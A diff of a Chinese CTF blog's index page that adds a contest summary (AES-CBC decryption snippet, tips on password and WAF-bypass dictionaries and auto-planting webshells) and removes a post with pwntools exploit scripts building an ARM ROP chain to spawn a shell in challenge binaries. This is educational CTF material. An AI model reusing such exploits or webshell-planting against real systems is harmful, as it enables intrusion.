@@ -148,7 +148,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 11.67px;">bin</a> <a href="/tags/code/" style="font-size: 13.33px;">code</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 13.33px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 18.33px;">web</a> <a href="/tags/writeup/" style="font-size: 16.67px;">writeup</a>
+                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12px;">bin</a> <a href="/tags/code/" style="font-size: 14px;">code</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 16px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 14px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/writeup/" style="font-size: 16px;">writeup</a>
                     </div>
                 </section>
                 
@@ -226,11 +226,83 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-2017-8-9" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/08/10/2017-8-9/" class="article-date">
+      <time datetime="2017-08-10T09:20:04.000Z" itemprop="datePublished">2017-08-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/10/2017-8-9/">8月9日个人赛总结 &amp;&amp; writeup</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure>
+<p>对于zip压缩包，还是archpr好用。。</p>
+<p>对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。</p>
+<p>对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）</p>
+<p>rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）</p>
+<p>线下赛的web waf需要完善。</p>
+<p>新的pyc加密方式  <code>stegosaurus</code></p>
+<p>writeup 如下<br>
+          
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a  href="/2017/08/10/2017-8-9/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-jarvisoj-web" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2017/06/17/jarvisoj-web/" class="article-date">
-      <time datetime="2017-06-16T23:13:07.000Z" itemprop="datePublished">2017-06-17</time>
+      <time datetime="2017-06-17T14:13:07.000Z" itemprop="datePublished">2017-06-17</time>
 </a>
     </div>
   
@@ -293,7 +365,7 @@
   
     <div class="article-meta">
       <a href="/2017/06/04/heap-all/" class="article-date">
-      <time datetime="2017-06-04T00:59:24.000Z" itemprop="datePublished">2017-06-04</time>
+      <time datetime="2017-06-04T15:59:24.000Z" itemprop="datePublished">2017-06-04</time>
 </a>
     </div>
   
@@ -358,7 +430,7 @@
   
     <div class="article-meta">
       <a href="/2017/06/03/墨色的五月/" class="article-date">
-      <time datetime="2017-06-03T00:20:53.000Z" itemprop="datePublished">2017-06-03</time>
+      <time datetime="2017-06-03T15:20:53.000Z" itemprop="datePublished">2017-06-03</time>
 </a>
     </div>
   
@@ -427,7 +499,7 @@
   
     <div class="article-meta">
       <a href="/2017/04/27/2017-429-final/" class="article-date">
-      <time datetime="2017-04-27T15:24:59.000Z" itemprop="datePublished">2017-04-27</time>
+      <time datetime="2017-04-28T06:24:59.000Z" itemprop="datePublished">2017-04-27</time>
 </a>
     </div>
   
@@ -500,7 +572,7 @@
   
     <div class="article-meta">
       <a href="/2017/04/22/429-2017/" class="article-date">
-      <time datetime="2017-04-21T23:38:33.000Z" itemprop="datePublished">2017-04-22</time>
+      <time datetime="2017-04-22T14:38:33.000Z" itemprop="datePublished">2017-04-22</time>
 </a>
     </div>
   
@@ -564,7 +636,7 @@
   
     <div class="article-meta">
       <a href="/2017/04/10/arm-double-free-attack/" class="article-date">
-      <time datetime="2017-04-10T00:50:31.000Z" itemprop="datePublished">2017-04-10</time>
+      <time datetime="2017-04-10T15:50:31.000Z" itemprop="datePublished">2017-04-10</time>
 </a>
     </div>
   
@@ -624,7 +696,7 @@
   
     <div class="article-meta">
       <a href="/2017/04/09/初探pwntools-fmt特性/" class="article-date">
-      <time datetime="2017-04-09T00:16:41.000Z" itemprop="datePublished">2017-04-09</time>
+      <time datetime="2017-04-09T15:16:41.000Z" itemprop="datePublished">2017-04-09</time>
 </a>
     </div>
   
@@ -696,7 +768,7 @@
   
     <div class="article-meta">
       <a href="/2017/04/08/how-to-get-libc/" class="article-date">
-      <time datetime="2017-04-07T16:29:54.000Z" itemprop="datePublished">2017-04-08</time>
+      <time datetime="2017-04-08T07:29:54.000Z" itemprop="datePublished">2017-04-08</time>
 </a>
     </div>
   
@@ -764,7 +836,7 @@
   
     <div class="article-meta">
       <a href="/2017/04/08/T3CTF2017/" class="article-date">
-      <time datetime="2017-04-07T16:26:51.000Z" itemprop="datePublished">2017-04-08</time>
+      <time datetime="2017-04-08T07:26:51.000Z" itemprop="datePublished">2017-04-08</time>
 </a>
     </div>
   
@@ -805,75 +877,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap-overflow/">heap overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ARM-overflow" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/04/07/ARM-overflow/" class="article-date">
-      <time datetime="2017-04-06T17:34:42.000Z" itemprop="datePublished">2017-04-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/07/ARM-overflow/">ARM环境下栈溢出攻击初探</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>题目来自于2016年全国高校网安联赛pwn专场。</p>
-<p>参考文献：<a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/107276.html</a></p>
-<p>其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要手工构造ropchain，首先去找system函数，虽然该bin文件去符号化了，但是由于存在/bin/sh字符串，跟踪一下就发现了如下函数。</p>
-<p>这不就是system函数么。。。</p>
-<p>接着用ROPgadget来找一个控制r0寄存器的ropchain就可以了。。如下命令</p>
-<p><code>ROPgadget --binary warmup --only &quot;pop&quot;|grep r0</code></p>
-<p>找到了</p>
-<p><code>0x00020904 : pop {r0, r4, pc}</code></p>
-<p>接着就剩下构造ropchian并执行了，如下脚本。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./warmup'</span>)</div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">p.sendline()</div><div class="line">raw_input()</div><div class="line">pr0_pr4_ret  =<span class="number">0x00020904</span></div><div class="line">bin_sh = <span class="number">0x6C384</span></div><div class="line">system = <span class="number">0x110B4</span></div><div class="line">payload = p32(pr0_pr4_ret)+p32(bin_sh)+p32(<span class="number">0</span>)+p32(system)</div><div class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x70</span>+payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>另一题login，模糊测试一下直接出payload。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./login'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x5d'</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Code\n\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARM/">ARM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
       
